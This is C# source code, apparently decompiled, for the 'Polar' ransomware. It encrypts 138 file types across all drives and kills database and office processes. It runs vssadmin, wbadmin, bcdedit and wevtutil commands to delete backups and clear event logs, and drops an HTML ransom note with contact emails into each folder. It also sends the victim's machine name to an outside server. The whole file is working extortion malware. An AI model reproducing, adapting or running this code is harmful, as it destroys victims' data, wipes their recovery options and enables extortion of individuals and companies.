using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using AES_EnDecryptor.Basement;
using Polar.Properties;

namespace Polar;

internal class Encode
{
	public class FileStreamModel
	{
		public int offset { get; set; }

		public string file { get; set; }
	}

	private static int filesSum = 0;

	public static int _BlockSize = 16;

	private static byte[] passwordBytes;

	public static string password = createPassword(8);

	public static string publickey = "<RSAKeyValue><Modulus>7LpRGq8ru0uybaPWr7rRzTzfPmz2UkETxc2IXw+iYLsX8+1yy1dyCswWiMTfRyaK6UEiaiWV+uiTaArxvOOWGhyioWdrsGnk/SSbBsuTBIhBMCcMPgYkr0ujQ9SgacPR6dD4yCpWehOVwNZIIIo0k3EtGvGEAyvD/oB7lsEkG00=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	public static string[] Filetype = new string[138]
	{
		".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd",
		".wps", ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt", ".pptx", ".sdf",
		".tar", ".tax2014", ".tax2015", ".vcf", ".xml", ".aif", ".iff", ".m3u", ".m4a", ".mid",
		".mp3", ".mpa", ".wav", ".wma", ".3g2", ".3gp", ".asf", ".avi", ".flv", ".m4v",
		".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv", ".3dm", ".3ds",
		".max", ".obj", ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd", ".tga", ".thm",
		".tif", ".tiff", ".yuv", ".ai", ".eps", ".ps", ".svg", ".indd", ".pct", ".pdf",
		".xlr", ".xls", ".xlsx", ".accdb", ".db", ".dbf", ".mdb", ".pdb", ".sql", ".dmp",
		".dwg", ".dxf", ".asp", ".aspx", ".cer", ".cfm", ".csr", ".css", ".html", ".js",
		".jsp", ".php", ".rss", ".xhtml", ".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar",
		".rpm", ".sitx", ".tar.gz", ".zip", ".zipx", ".bin", ".cue", ".dmg", ".iso", ".mdf",
		".toast", ".vcd", ".c", ".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java",
		".lua", ".m", ".pl", ".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj",
		".bak", ".tmp", ".crdownload", ".ics", ".msi", ".part", ".torrent", ".ini"
	};

	public static string[] Exetype = new string[43]
	{
		"msftesql.exe", "sqlagent.exe", "sqlbrowser.exe", "sqlservr.exe", "sqlwriter.exe", "oracle.exe", "ocssd.exe", "dbsnmp.exe", "synctime.exe", "agntsvc.exe",
		"mydesktopqos.exe", "isqlplussvc.exe", "xfssvccon.exe", "mydesktopservice.exe", "ocautoupds.exe", "agntsvc.exe", "agntsvc.exe", "agntsvc.exe", "encsvc.exe", "firefoxconfig.exe",
		"tbirdconfig.exe", "ocomm.exe", "mysqld.exe", "mysqld-nt.exe", "mysqld-opt.exe", "dbeng50.exe", "sqbcoreservice.exe", "excel.exe", "infopath.exe", "msaccess.exe",
		"mspub.exe", "onenote.exe", "outlook.exe", "powerpnt.exe", "steam.exe", "thebat.exe", "thebat64.exe", "thunderbird.exe", "visio.exe", "winword.exe",
		"wordpad.exe", "notepad.exe", "notepad++.exe"
	};

	public static string encode_str = RSAEncrypt(publickey, password);

	public static readonly byte[] SALT = new byte[8] { 11, 46, 18, 4, 19, 0, 7, 62 };

	public static int _SkipSize { get; set; }

	[DllImport("user32.dll")]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern int Wow64DisableWow64FsRedirection(ref IntPtr ptr);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern int Wow64EnableWow64FsRedirection(ref IntPtr ptr);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern int Wow64RevertWow64FsRedirection(ref IntPtr ptr);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

	public static string getOsname()
	{
		string text = null;
		try
		{
			text = Environment.GetEnvironmentVariable("computername");
			if (text.Length == 0)
			{
				text = Environment.MachineName;
				return text;
			}
			return text;
		}
		catch (Exception)
		{
			return text;
		}
	}

	public static void InstallOk()
	{
		string osname = getOsname();
		try
		{
			using WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection["Osname"] = osname;
			byte[] bytes = webClient.UploadValues("http://www.therockbrazil.com.br/assinaturas/logs.php", "POST", nameValueCollection);
			Encoding.UTF8.GetString(bytes);
		}
		catch (Exception)
		{
		}
	}

	public static bool Is64Bit()
	{
		IsWow64Process(Process.GetCurrentProcess().Handle, out var lpSystemInfo);
		return lpSystemInfo;
	}

	public static string RunCMDCommand(string cmd)
	{
		string fileName = "C:\\Windows\\System32\\cmd.exe";
		cmd = cmd.Trim().TrimEnd(new char[1] { '&' }) + "&exit";
		Console.WriteLine(cmd);
		string empty = string.Empty;
		Process process = new Process();
		try
		{
			process.StartInfo.FileName = fileName;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine(cmd);
			process.StandardInput.AutoFlush = true;
			empty = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			process.Close();
			return empty;
		}
		catch (Exception)
		{
			return string.Empty;
		}
		finally
		{
			process.Dispose();
		}
	}

	public static void KillProcess(string processName)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == processName)
			{
				process.Kill();
			}
		}
	}

	public static void killerps_list()
	{
		Process[] processes = Process.GetProcesses();
		for (int i = 0; i < processes.GetLength(0); i++)
		{
			if (Array.IndexOf(Exetype, processes[i].ProcessName + ".exe".ToString()) >= 0)
			{
				try
				{
					KillProcess(processes[i].ProcessName.ToString());
				}
				catch (Exception)
				{
				}
			}
		}
	}

	public static void clearlog()
	{
		string[] array = new string[14]
		{
			"dism /online /enable-feature /featurename:NetFx3", "vssadmin.exe Delete Shadows /All /Quiet", "bcdedit /set {default} recoveryenabled no", "wmic shadowcopy delete", "wbadmin delete backup", "wbadmin delete systemstatebackup -keepversions:0", "bcdedit /set {default} bootstatuspolicy ignoreallfailures", "bcdedit /set {default} recoveryenabled no", "wevtutil.exe clear-log Application", "wevtutil.exe clear-log Security",
			"wevtutil.exe clear-log System", "wbadmin delete catalog -quiet", "wbadmin delete catalog -quiet", "wbadmin delete systemstatebackup"
		};
		bool flag = Is64Bit();
		IntPtr ptr = IntPtr.Zero;
		if (flag)
		{
			Wow64DisableWow64FsRedirection(ref ptr);
			string[] array2 = array;
			foreach (string cmd in array2)
			{
				RunCMDCommand(cmd);
			}
		}
		else
		{
			Wow64RevertWow64FsRedirection(ref ptr);
			string[] array3 = array;
			foreach (string cmd2 in array3)
			{
				RunCMDCommand(cmd2);
			}
		}
	}

	public static string RSAEncrypt(string publickey, string content)
	{
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publickey);
		byte[] inArray = rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(content), fOAEP: false);
		return Convert.ToBase64String(inArray);
	}

	public static void encode_aes_key(string WriteDict)
	{
		string value = $"<font size=\"6\" color=\"red\"><b>Your companies cyber defense systems have been weighed, measured and have been found wanting!!!</br></font><font size=\"5\" color=\"blue\"><b>The breach is a result of grave neglect of security protocols</br></font><font size=\"5\" color=\"blue\"><b>All of your computers have been corrupted with Polar malware that has encrypted your files.</br></font><font size=\"5\" color=\"blue\"><b>We ensure that the only way to retrieve your data swiftly and securely is with our software.</br><font size=\"5\" color=\"blue\"><b>Restoration of your data requires a private key which only we possess</br><font size=\"5\" color=\"blue\"><b>Don't waste your time and money purchasing third party software, without the private key they are useless.</br><font size=\"5\" color=\"blue\"><b>It is critical that you don't restart or shutdown your computer.</br><font size=\"5\" color=\"blue\"><b>This may lead to irreversible damage to your data and you may not be able to turn your computer back on.</br><font size=\"5\" color=\"blue\"><b>To confirm that our software works email to us 2 files from random computers you will get them decrypted.</br><font size=\"5\" color=\"red\"><b>readme_contact_alex.dali@iran.ir.htm contain encrypted session keys we need in order to be able to decrypt your files.</br><font size=\"5\" color=\"blue\"><b>The softwares price will include a guarantee that your company will never be inconvenienced by us.</br><font size=\"5\" color=\"blue\"><b>You will also receive a consultation on how to improve your companies cyber security </br><font size=\"6\" color=\"red\"><b>If you want to purchase our software to restore your data contact us at:</br></font><font size=\"6\" color=\"red\"><b>Pt34Jarmys@protonmail.com</br></font><font size=\"6\" color=\"red\"><b>alex.dali@iran.ir</br></br></font><font size=\"5\" color=\"black\"><b>We can only show you the door. You're the one who has to walk through it.</br></br><font size=\"5\" color=\"red\"><b>Your personal installation key:{encode_str}</br></br></b>";
		try
		{
			using StreamWriter streamWriter = new StreamWriter(WriteDict + "\\readme_contact_alex.dali@iran.ir.htm");
			streamWriter.WriteLine(value);
		}
		catch (Exception)
		{
		}
	}

	public static string createPassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		passwordBytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
		passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
		return stringBuilder.ToString();
	}

	public static void changeBackPictrue()
	{
		string text = "c:\\programdata\\Rs.bmp";
		if (!File.Exists(text))
		{
			Image rS = (Image)(object)Resources.RS;
			rS.Save(text, ImageFormat.get_Bmp());
			SystemParametersInfo(20, 0, text, 2);
		}
		else
		{
			File.Delete(text);
			Image rS2 = (Image)(object)Resources.RS;
			rS2.Save(text, ImageFormat.get_Bmp());
			SystemParametersInfo(20, 0, text, 2);
		}
	}

	public static void Actions()
	{
		_SkipSize = _BlockSize * 800;
		clearlog();
		killerps_list();
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			DirectoryInfo dir = new DirectoryInfo(driveInfo.Name);
			getFilesPath(dir);
		}
		changeBackPictrue();
		clearlog();
		InstallOk();
	}

	public static void Main(string[] args)
	{
	}

	public static void sec_EncryptFile(string source, string output, string password)
	{
		try
		{
			using FileStream fileStream = new FileStream(source, FileMode.Open);
			using FileStream fileStream2 = new FileStream(output, FileMode.Create);
			long length = fileStream.Length;
			int num = 0;
			float num2 = (float)(_SkipSize + _BlockSize) * 1f / (float)length;
			double num3 = 0.0;
			AES aES = new AES(AES.KeySize.Bits256, Security.GetKey(password));
			byte[] array = new byte[_BlockSize];
			byte[] array2 = new byte[_BlockSize];
			num = fileStream.Read(array, 0, _BlockSize);
			while (num != 0)
			{
				aES.Cipher(array, array2);
				fileStream2.Write(array2, 0, num);
				array = new byte[_SkipSize];
				num = fileStream.Read(array, 0, _SkipSize);
				if (num != 0)
				{
					fileStream2.Write(array, 0, num);
					array = new byte[_BlockSize];
					num = fileStream.Read(array, 0, _BlockSize);
					if (num != 0)
					{
						num3 += (double)num2;
						continue;
					}
					break;
				}
				break;
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Encrypt Failed ! ErrorMessage :" + ex.Message);
		}
	}

	public static byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, SALT, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
	{
		return attributes & ~attributesToRemove;
	}

	public static void encryptFile(string file)
	{
		try
		{
			try
			{
				if (new FileInfo(file).Length <= 64052000L)
				{
					byte[] bytes = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes);
					File.Move(file, file + ".locked");
				}
				else
				{
					sec_EncryptFile(file, file + ".cryptd", password);
					File.Delete(file);
				}
			}
			catch (Exception)
			{
				FileAttributes attributes = File.GetAttributes(file);
				if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
				{
					attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
					File.SetAttributes(file, attributes);
				}
				if (new FileInfo(file).Length <= 64052000L)
				{
					byte[] bytes2 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes2);
					File.Move(file, file + ".locked");
				}
				else
				{
					sec_EncryptFile(file, file + ".cryptd", password);
					File.Delete(file);
				}
			}
		}
		catch
		{
		}
	}

	private static void getFilesPath(DirectoryInfo dir)
	{
		try
		{
			FileInfo[] files = dir.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				if (Array.IndexOf(Filetype, fileInfo.Extension) >= 0)
				{
					encryptFile(fileInfo.FullName);
				}
			}
		}
		catch (StackOverflowException ex)
		{
			Console.WriteLine(ex.Message);
		}
		catch (UnauthorizedAccessException ex2)
		{
			Console.WriteLine(ex2.Message);
		}
		catch (IOException ex3)
		{
			Console.WriteLine(ex3.Message);
		}
		try
		{
			DirectoryInfo[] directories = dir.GetDirectories();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo in array2)
			{
				if (!directoryInfo.FullName.Contains("C:\\Windows") && !directoryInfo.FullName.Contains("C:\\Program Files\\") && !directoryInfo.FullName.Contains("C:\\Program Files (x86)") && !directoryInfo.FullName.Contains("C:\\ProgramData") && !directoryInfo.FullName.Contains("C:\\Python") && !directoryInfo.FullName.Contains("$SysReset") && !directoryInfo.FullName.Contains("$Recycle.Bin") && !directoryInfo.FullName.Contains("$RECYCLE.BIN"))
				{
					encode_aes_key(directoryInfo.FullName);
					getFilesPath(directoryInfo);
				}
			}
		}
		catch (StackOverflowException ex4)
		{
			Console.WriteLine(ex4.Message);
		}
		catch (UnauthorizedAccessException ex5)
		{
			Console.WriteLine(ex5.Message);
		}
		catch (IOException ex6)
		{
			Console.WriteLine(ex6.Message);
		}
	}
}
